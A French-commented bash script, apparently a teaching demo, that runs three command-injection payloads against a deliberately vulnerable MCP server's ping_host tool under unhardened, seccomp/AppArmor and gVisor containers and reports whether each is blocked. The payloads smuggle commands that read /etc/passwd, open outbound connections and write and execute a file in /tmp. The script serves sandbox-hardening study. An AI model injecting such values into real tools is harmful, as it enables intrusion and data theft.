#!/bin/bash
# Démonstration "attaque contenue" (Chapitre 7).
# Rejoue 3 attaques sur 3 configurations via l'injection de commande
# du serveur MCP volontairement vulnérable (ping_host, CWE-78).
# Le test de no-egress réel (réseau internal:true) est fait séparément,
# par docker exec direct, car ce conteneur n'est pas joignable en HTTP
# depuis l'hôte (c'est justement la preuve que le no-egress fonctionne).
cd "$(dirname "$0")/.."

run_attack() {
  local port="$1" payload="$2" label="$3" expect_marker="$4"
  echo "  --- $label ---"
  echo "  commande MCP : ping_host(hostname=\"$payload\")"
  out=$(python /tmp/attack_test.py "$port" "$payload" 2>&1)
  echo "  sortie brute :"
  echo "$out" | sed 's/^/    /'
  if echo "$out" | grep -qE "Client failed to connect|ReadError|ConnectError"; then
    echo "  => [ERREUR TECHNIQUE - a reessayer]"
  elif echo "$out" | grep -qE "Client failed to connect|ReadError|ConnectError"; then
    echo "  => [ERREUR TECHNIQUE - a reessayer]"
  elif echo "$out" | grep -q "$expect_marker"; then
    echo "  => [BLOQUEE]"
  else
    echo "  => [REUSSIE]"
  fi
  echo ""
}

test_config() {
  local compose_file="$1" port="$2" name="$3"
  echo "######## Config : $name ########"
  docker compose -f "$compose_file" up -d >/dev/null 2>&1
  sleep 3
  run_attack "$port" "127.0.0.1; cat /etc/passwd" \
    "Lecture fichier hôte" "Permission denied"
  run_attack "$port" "127.0.0.1; python3 -c \"import socket;socket.create_connection(('8.8.8.8',53),3);print('EGRESS_OK')\"" \
    "Connexion réseau sortante (réseau non-internal)" "TimeoutError"
  run_attack "$port" "127.0.0.1; echo 'echo PWNED' > /tmp/x.sh && chmod +x /tmp/x.sh && /tmp/x.sh" \
    "Écriture + exécution /tmp" "Permission denied"
  docker compose -f "$compose_file" down >/dev/null 2>&1
}

test_no_egress_officiel() {
  echo "######## Test complémentaire : no-egress réel (réseau internal:true) ########"
  docker compose -f docker-compose.vulnerable-hardened.yml up -d >/dev/null 2>&1
  sleep 3
  echo "  --- Connexion réseau sortante (docker exec direct, config officielle no-egress) ---"
  out=$(docker exec mcp-vulnerable-server-HARDENED python3 -c \
    "import socket;socket.create_connection(('8.8.8.8',53),3);print('EGRESS_OK')" 2>&1)
  echo "$out" | sed 's/^/    /'
  if echo "$out" | grep -q "Network is unreachable"; then
    echo "  => [BLOQUEE]"
  else
    echo "  => [REUSSIE]"
  fi
  docker compose -f docker-compose.vulnerable-hardened.yml down >/dev/null 2>&1
}

docker compose -f docker-compose.vulnerable.yml down >/dev/null 2>&1 || true
docker compose -f docker-compose.vulnerable-seccomp-apparmor-test.yml down >/dev/null 2>&1 || true
docker compose -f docker-compose.vulnerable-hardened-demo.yml down >/dev/null 2>&1 || true
docker compose -f docker-compose.vulnerable-hardened.yml down >/dev/null 2>&1 || true

test_config docker-compose.vulnerable.yml 8001 "Sans protection"
test_config docker-compose.vulnerable-seccomp-apparmor-test.yml 8003 "Docker durci (seccomp+AppArmor, sans gVisor)"
sleep 7
sleep 7
test_config docker-compose.vulnerable-hardened-demo.yml 8003 "gVisor durci (réseau joignable, démo)"
test_no_egress_officiel
